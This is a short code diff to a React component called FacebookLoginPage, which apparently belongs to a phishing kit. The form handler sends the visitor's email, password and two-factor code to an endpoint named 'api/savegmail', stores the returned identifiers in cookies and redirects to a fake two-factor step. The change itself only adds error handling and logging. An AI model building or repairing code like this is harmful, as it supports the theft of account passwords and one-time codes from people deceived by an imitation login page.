@@ -15,20 +15,24 @@ function FacebookLoginPage() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    const res = await axios.post("api/savegmail", {
-      email,
-      password,
-      towFactor,
-    });
+    try {
+      const res = await axios.post("api/savegmail", {
+        email,
+        password,
+        towFactor,
+      });
 
-    const uid = await res.data.uid;
-    const resEmail = await res.data.email;
+      const uid = await res.data.uid;
+      const resEmail = await res.data.email;
 
-    if (res.statusText == "OK") {
+      console.log(res);
+
       await Cookies.set("uid", uid);
       await Cookies.set("email", resEmail);
       await console.log(Cookies.get());
       router.push("/facebook/tow-factor");
+    } catch (error) {
+      console.log(error);
     }
   };
   return (
